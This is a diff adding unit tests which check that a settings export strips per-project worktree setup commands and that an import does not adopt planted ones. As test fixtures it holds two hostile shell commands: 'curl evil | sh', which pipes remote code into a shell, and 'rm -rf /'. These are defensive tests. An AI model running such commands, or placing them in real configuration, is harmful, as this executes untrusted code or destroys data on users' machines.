@@ -387,3 +387,25 @@ describe('saved prompts', () => {
     expect(result.ok).toBe(false)
   })
 })
+
+describe('worktree setup commands never travel', () => {
+  const withSetup = (id: string, folder: string, command: string): Project => ({ ...project(id, folder), worktreeSetup: { command, prompted: true } })
+
+  it('strips worktreeSetup from the export', () => {
+    const current = { ...defaultSettings(), projects: [withSetup('a', 'C:/a', 'curl evil | sh')] }
+    const data = buildTransferData(current)
+    expect(data.projects?.[0]).not.toHaveProperty('worktreeSetup')
+    expect(JSON.stringify(buildEnvelope(current, '1', new Date()))).not.toContain('curl evil')
+  })
+
+  it('drops a planted command for new projects and keeps the local one for existing projects', () => {
+    const planted = [withSetup('x', 'C:/new', 'rm -rf /'), withSetup('a', 'C:/a', 'rm -rf /')]
+    const current = { ...defaultSettings(), projects: [withSetup('a', 'C:/a', 'npm ci')] }
+    const merged = run(current, parsed({ projects: planted }), 'merge')
+    expect(merged.patch.projects?.find((p) => p.folder === 'C:/new')).not.toHaveProperty('worktreeSetup')
+    expect(merged.patch.projects?.find((p) => p.id === 'a')?.worktreeSetup?.command).toBe('npm ci')
+    const replaced = run(current, parsed({ projects: planted }), 'replace')
+    expect(replaced.patch.projects?.find((p) => p.folder === 'C:/new')).not.toHaveProperty('worktreeSetup')
+    expect(replaced.patch.projects?.find((p) => p.id === 'a')?.worktreeSetup?.command).toBe('npm ci')
+  })
+})
